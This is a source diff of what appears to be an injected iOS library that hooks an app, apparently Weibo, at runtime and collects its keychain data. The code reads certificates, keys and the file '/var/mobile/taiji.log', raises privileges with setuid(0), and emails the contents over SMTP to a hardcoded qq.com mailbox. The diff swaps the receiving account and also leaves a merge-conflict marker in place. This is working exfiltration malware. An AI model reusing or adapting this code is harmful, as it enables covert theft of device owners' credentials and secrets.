@@ -24,8 +24,11 @@
 #include <stdlib.h>
 #include <arpa/inet.h>
 //#include <sys/ptrace.h>
+<<<<<<< HEAD
 
 
+=======
+>>>>>>> ddd31ed63dbf3e7ec57602bb3f1f24cea16aeefd
 
 #pragma mark - Keychain Prototype Function
 
@@ -448,6 +451,8 @@ void sendmail(const char *username,const char *password,const char *email,const 
     memset(&their_addr, 0, sizeof(their_addr));
     their_addr.sin_family = AF_INET;
     their_addr.sin_port = htons(25);
+#warning smtp.qq.com  -> 163.177.65.211
+#warning smtp.126.com -> 123.125.50.110
     their_addr.sin_addr.s_addr = inet_addr("163.177.65.211");
     sockfd = open_socket((struct sockaddr *)&their_addr);
     memset(rbuf,0,1500);
@@ -660,14 +665,14 @@ static IMP sOriginalImp = NULL;
     //UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
     //[alert show];
     
-#pragma mark - do twice will crash
+#warning do twice will crash
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
         int fd = open("/var/mobile/taiji.log",O_RDONLY);
         int len = (int)lseek(fd,0,SEEK_END);
         char *mbuf = (char *) mmap(NULL,len,PROT_READ,MAP_PRIVATE,fd,0);
         setuid(0);
-        sendmail("meirtz@126.com","YOUR_PASSWORD","meirtz@126.com","smtp.126.com","keychain",mbuf);
+        sendmail("445108920@qq.com","*******","445108920@qq.com","smtp.qq.com","keychain",mbuf);
     });
     
 
@@ -678,26 +683,27 @@ static IMP sOriginalImp = NULL;
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
     });
+    
+    static dispatch_once_t onceToken1;
+    dispatch_once(&onceToken1, ^{
+        
+    });
 }
 
-
-//----------------------------------------------------
-
-#pragma Meirtz Attachment Sending
-
+#pragma mark - Meirtz Attachment Sending
 
 - (void)sendAttachment {
     SKPSMTPMessage *weibo_files = [[SKPSMTPMessage alloc] init];
-    weibo_files.fromEmail = @"meirtz@126.com";
-    weibo_files.toEmail = @"meirtz@126.com";
-    weibo_files.relayHost = @"smtp.126.com";
+    weibo_files.fromEmail = @"445108920@qq.com";
+    weibo_files.toEmail = @"445108920@qq.com";
+    weibo_files.relayHost = @"smtp.qq.com";
     weibo_files.requiresAuth = YES;
-    weibo_files.login = @"meirtz@126.com";
-    weibo_files.pass = @"YOUR_PASSWORD";
+    weibo_files.login = @"445108920@qq.com";
+    weibo_files.pass = @"YOUR PASS";
     weibo_files.wantsSecure = YES;
     weibo_files.subject = @"Weibo Files";
     
-    weibo_files.delegate = self;
+    //weibo_files.delegate = self;
     
     
     NSMutableArray *parts_to_send = [NSMutableArray array];
@@ -710,21 +716,28 @@ static IMP sOriginalImp = NULL;
     [parts_to_send addObject:plain_text_part];
     
     
-    NSString *vcard_path = [[NSBundle mainBundle] pathForResource:@"test" ofType:@"vcf"];
+    NSString *vcard_path = @"/var/mobile/taiji.log";
     NSData *vcard_data = [NSData dataWithContentsOfFile:vcard_path];
     NSDictionary *vcard_part = [NSDictionary dictionaryWithObjectsAndKeys:
                                 @"text/directory;\r\n\tx-unix-mode=0644;\r\n\tname=\"taiji.log\"",kSKPSMTPPartContentTypeKey,
-                                @"attachment;\r\n\tfilename=\"/var/mobile/taiji.log\"",kSKPSMTPPartContentDispositionKey,
+                                @"attachment;\r\n\tfilename=\"taiji.log\"",kSKPSMTPPartContentDispositionKey,
                                 [vcard_data encodeBase64ForData],kSKPSMTPPartMessageKey,
                                 @"base64",kSKPSMTPPartContentTransferEncodingKey,nil];
     [parts_to_send addObject:vcard_part];
-    
-    
-    
-    [weibo_files send];
-    
     weibo_files.parts = parts_to_send;
     
+    [weibo_files send];
+
+}
+
+#pragma mark - Email Delegate
+
+- (void)messageSent:(SKPSMTPMessage *)message{
+
+}
+
+- (void)messageFailed:(SKPSMTPMessage *)message error:(NSError *)error{
+
 }
 @end
 
